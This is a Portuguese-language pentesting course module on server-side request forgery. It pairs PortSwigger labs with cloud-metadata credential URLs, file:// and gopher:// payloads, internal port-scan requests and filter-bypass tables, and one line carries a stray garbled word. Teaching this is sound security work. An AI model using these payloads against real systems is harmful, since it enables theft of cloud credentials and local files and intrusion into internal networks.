# 🌐 06. SSRF — Server-Side Request Forgery

> Uma aplicação web que faz pedidos por você pode ser forçada a fazer pedidos contra ela mesma — ou contra a rede interna.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 70min | ⭐⭐⭐ Avançado | `curl, Burp Repeater, Collaborator` |

</div>

---

## 🎓 Por que isso importa?

SSRF ocorre quando uma aplicação web **busca um recurso remoto** baseado em input do usuário, sem validar a URL. O servidor se torna um proxy involuntário do atacante.

**Analogia:** Imagine que você pede para um colega ir ao supermercado comprar pão. Em vez de ir à padaria, você dá o endereço da sala do diretor da empresa dele — e ele vai, sem questionar, porque você é quem pediu.

**Impacto real:**
- Acessar cloud metadata (AWS, GCP, Azure) → **roubar credenciais IAM**
- Acessar serviços internos (banco de dados, Redis, admin panels)
- Escanear a rede interna do servidor
- Executar SSRF via XML/SVG upload (XXE chained com SSRF)
- Poisoning de cache (web cache deception)

**OWASP 2025:** Incorporado ao **A01:2025 Broken Access Control** (CWE-918)

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics (GET/POST, headers) | Sim | Módulo 00 |
| Burp Suite (Proxy, Repeater) | Sim | Arquivo 01 deste módulo |
| O que é rede interna (LAN) | Sim | Módulo 00 |

---

## 🎯 Quando usar SSRF

- Quando a aplicação aceita **URLs como parâmetro** (ex: `url=https://example.com`)
- Quando existe **fetch/request que usa input do usuário**
- Para acessar **painéis admin internos** (127.0.0.1:8080/admin)
- Para roubar **credenciais de cloud** via metadata endpoint
- Para **escanear portas** do servidor (127.0.0.1:22, 3306, 6379)
- Para encadear com **XXE** (SSRF via XML parsing)

---

## 🔄 Como funciona na prática

```
┌──────────────┐         ┌──────────────────┐         ┌──────────────┐
│   Atacante   │ ──URL──►│   App Web        │ ──GET──►│  127.0.0.1   │
│              │         │  (servidor)      │         │  (metadata)  │
└──────────────┘         └──────────────────┘         └──────────────┘
                                │
                                ▼
                         ┌──────────────┐
                         │  Resposta    │
                         │  exposta ao  │
                         │  atacante    │
                         └──────────────┘

Exemplo fluxo SSRF:
1. App aceita: GET /fetch?url=http://example.com
2. Atacante manda: GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. App busca o metadata endpoint → retorna credenciais IAM
4. Atacante recebe as credenciais
```

---

## 🛠️ Endpoints de Cloud Metadata

### AWS (IMDSv1 — sem autenticação)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS (IMDSv2 — com token)

```bash
# Passo 1: Obter token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Passo 2: Usar token para acessar metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

---

## 📝 Tipos de SSRF

### 1. SSRF Clássico (resposta visível)

A resposta do request server-side é retornada ao atacante.

```
GET /fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
Host: target.com

→ Resposta: {"users": ["admin", "user1", "user2"]}
```

### 2. Blind SSRF (sem resposta)

O servidor faz o request, mas a resposta não é retornada ao atacante. Usar **OOB (Out-of-Band)** para detectar.

```
GET /fetch?url=http://YOUR-COLLABORATOR-ID.burpcollaborator.net HTTP/1.1
Host: target.com

→ O servidor faz request para seu Collaborator
→ Você vê o request no Collaborator
```

### 3. SSRF via DNS Rebinding

```
1. Atacante registra domínio: evil.com
2. Primeira resolução DNS → IP interno (127.0.0.1)
3. Segunda resolução DNS → IP externo (validar que SSRF existe)
4. Ferramenta: rbndr.us (DNS rebinding service)
```

### 4. SSRF com Protocol Smuggling

```
# file:// — ler arquivos locais
url=file:///etc/passwd

# gopher:// — enviar raw TCP
url=gopher://127.0.0.1:6379/_SET%20pwned%20true

# dict:// — enumeração de serviços
url=dict://127.0.0.1:6379/INFO
```

---

## 📋 Tabela de Bypasses de SSRF

### Blacklist Bypass

| Filtro | Bypass |
|--------|--------|
| `127.0.0.1` bloqueado | `127.1`, `0x7f000001`, `0177.0.0.1`, `2130706433` |
| `localhost` bloqueado | `localtest.me`, `127.0.0.1.nip.io`, `[::1]` |
| `http://` bloqueado | `file:///etc/passwd`, `gopher://`, `dict://` |
| `169.254.169.254` bloqueado | `http://0177.0.0.1%252f@169.254.169.254` |
| Porta 80 bloqueada | `127.0.0.1:443`, `127.0.0.1:8080`, `127.0.0.1:8443` |
| Keyword filter | URL encode: `%252e%252e`, double URL encode |
| Whitelist com open redirect | Redirecionar para alvo interno via redirect externo |

### Whitelist Bypass

```
# Se a whitelist aceita subdomínios de target.com:
http://target.com.attacker.com → DNS para 127.0.0.1
http://target.com@127.0.0.1 → URL parsing confuso
http://127.0.0.1#@target.com → fragment confuso
```

---

## 📝 Exemplos Práticos

### Exemplo 1: Testar SSRF Básico

```bash
# Via curl — testar se servidor busca URL
curl -v "http://target.com/fetch?url=http://127.0.0.1:8080"

# Output esperado se SSRF existe:
# HTTP/1.1 200 OK
# ...
# {"status": "ok", "response": "Admin Panel - Welcome"}
```

### Exemplo 2: SSRF via Burp Repeater

```bash
# 1. Capturar request com parâmetro de URL no Burp
# 2. Enviar para Repeater (Ctrl+R)
# 3. Modificar o parâmetro URL:

GET /api/check?url=http://127.0.0.1:8080/admin HTTP/1.1
Host: target.com
Cookie: session=abc123

# 4. Enviar e observar response
# 5. Testar端口variações:

GET /api/check?url=http://127.0.0.1:3306 HTTP/1.1    (MySQL)
GET /api/check?url=http://127.0.0.1:6379 HTTP/1.1    (Redis)
GET /api/check?url=http://127.0.0.1:9200 HTTP/1.1    (Elasticsearch)
```

### Exemplo 3: AWS Metadata Exfil

```bash
# 1. Encontrar parâmetro de URL
# 2. Testar com metadata endpoint

GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com

# Output esperado (se SSRF existe):
# ami-id
# hostname
# instance-id
# instance-type
# local-hostname
# local-ipv4
# security-groups

# 3. Acessar credenciais IAM
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com

# Output: nome-do-role (ex: "ec2-role-readonly")

# 4. Acessar credenciais do role
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-readonly HTTP/1.1

# Output:
# {
#   "Code" : "Success",
#   "AccessKeyId" : "AKIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token" : "FwoGZXIvYXdzEBYa...",
#   "Expiration" : "2025-01-01T00:00:00Z"
# }
```

### Exemplo 4: Blind SSRF via Burp Collaborator

```bash
# 1. Burp Suite → Burp → Burp Collaborator client
# 2. Copy to clipboard → copia ID único
# 3. Enviar request com URL do Collaborator:

GET /api/webhook?url=http://YOUR-ID.burpcollaborator.net HTTP/1.1
Host: target.com

# 4. No Collaborator: Poll now
# 5. Se aparecer request DNS + HTTP → SSRF confirmado (blind)
```

### Exemplo 5: SSRF via file:// Protocol

```bash
# Ler arquivo /etc/passwd
GET /api/fetch?url=file:///etc/passwd HTTP/1.1
Host: target.com

# Output esperado:
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Exemplo 6: Bypass com URL Encode

```bash
# Se "127.0.0.1" é bloqueado:
# Usar variação numérica
GET /api/fetch?url=http://0x7f000001/ HTTP/1.1        (hex)
GET /api/fetch?url=http://0177.0.0.1/ HTTP/1.1        (octal)
GET /api/fetch?url=http://2130706433/ HTTP/1.1        (decimal)
GET /api/fetch?url=http://127.1/ HTTP/1.1             (abreviado)

# Se "localhost" é bloqueado:
GET /api/fetch?url=http://localtest.me/ HTTP/1.1       (resolve para 127.0.0.1)
GET /api/fetch?url=http://127.0.0.1.nip.io/ HTTP/1.1  (DNS personalizado)
```

---

## 🔄 Fluxo de Teste SSRF

```
┌─────────────────────────────────────────────────────────┐
│  1. IDENTIFICAR PARÂMETROS DE URL                        │
│     - Procurar parâmetros que aceitam URLs               │
│     - Analisar como a app faz requests                   │
│     - Ferramentas: Burp Spider, manual exploration       │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. TESTAR SSRF CLÁSSICO                                 │
│     - url=http://127.0.0.1:8080                         │
│     - url=http://localhost                               │
│     - url=http://[::1]                                   │
│     - Se retornar algo interno → SSRF confirmado         │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. TESTAR BLIND SSRF                                    │
│     - url=http://YOUR-COLLABORATOR.burpcollaborator.net  │
│     - Se Collaborator receber request → SSRF confirmado  │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. ESCANEAR REDE INTERNA                                │
│     - Iterar IPs: 127.0.0.1:1-65535                    │
│     - http://127.0.0.1:22 (SSH)                         │
│     - http://127.0.0.1:3306 (MySQL)                     │
│     - http://127.0.0.1:6379 (Redis)                     │
│     - http://127.0.0.1:9200 (Elastic)                   │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  5. TENTAR CLOUD METADATA                                │
│     - http://169.254.169.254/latest/meta-data/           │
│     - AWS, GCP, Azure                                    │
│     - Se retornar dados → CRÍTICO                        │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  6. BYPASS DE FILTROS                                    │
│     - Se blacklisted: variações de IP, encoding          │
│     - Se whitelisted: open redirect, DNS rebinding       │
│     - Protocol smuggling: gopher://, file://, dict://    │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "Não sei se é SSRF ou só request normal" | Testar com 127.0.0.1 — se retornar algo interno, é SSRF |
| "Blind SSRF — não vejo resposta" | Usar Burp Collaborator ou webhook.site para detectar |
| "Metadata não funciona" | Cloud pode usar IMDSv2 (requer token) — verificar |
| "Blacklist bloqueia tudo" | Tentar variações: hex, octal, decimal, DNS rebinding |
| "Whitelist filtra só target.com" | Usar open redirect em domínio no whitelist |
| "Request não sai do servidor" | Verificar se é POST body, header, ou outro input method |

---

## 📋 Cheat Sheet Rápido

### URLs de Teste (copiar e colar)

```
# Teste básico
http://127.0.0.1
http://localhost
http://[::1]

# AWS metadata
http://169.254.169.254/latest/meta-data/

# Ler arquivos
file:///etc/passwd
file:///proc/self/environ
file:///proc/version

# Port scanning
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

### Burp Collaborator Setup

```bash
# 1. Burp → Burp → Burp Collaborator client
# 2. Copy to clipboard
# 3. Injetar no parâmetro:
url=http://SEU-ID.burpcollaborator.net
# 4. Poll now → verificar se recebeu request
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost) | SSRF básico, 127.0.0.1 | 15min |
| 2 | PortSwigger | [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system) | SSRF em rede interna | 15min |
| 3 | PortSwigger | [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection) | Blind SSRF, Collaborator | 20min |
| 4 | PortSwigger | [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter) | Bypass de blacklist | 20min |
| 5 | PortSwigger | [SSRF with filter bypass via open redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection) | Open redirect + SSRF | 25min |
| 6 | PortSwigger | [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter) | Bypass de whitelist | 30min |

---

## 📚 Referências

- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [PortSwigger — SSRF Labs](https://portswigger.net/web-security/ssrf)
- [OWASP — SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [HackTricks — SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [AWS Metadata Security](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar parâmetros de URL em uma aplicação web
- [ ] Testar SSRF básico com `http://127.0.0.1` e `http://localhost`
- [ ] Detectar Blind SSRF usando Burp Collaborator
- [ ] Enumerar portas do servidor via SSRF
- [ ] Acessar endpoints de cloud metadata (AWS IMDSv1/v2, GCP, Azure)
- [ ] Bypassar blacklists de SSRF (hex, octal, decimal, DNS rebinding)
- [ ] Bypassar whitelists usando open redirects
- [ ] Usar protocol smuggling (file://, gopher://, dict://)
- [ ] Encadear SSRF com XXE para ler arquivos locais
- [ ] Completar todos os labs PortSwigger de SSRF
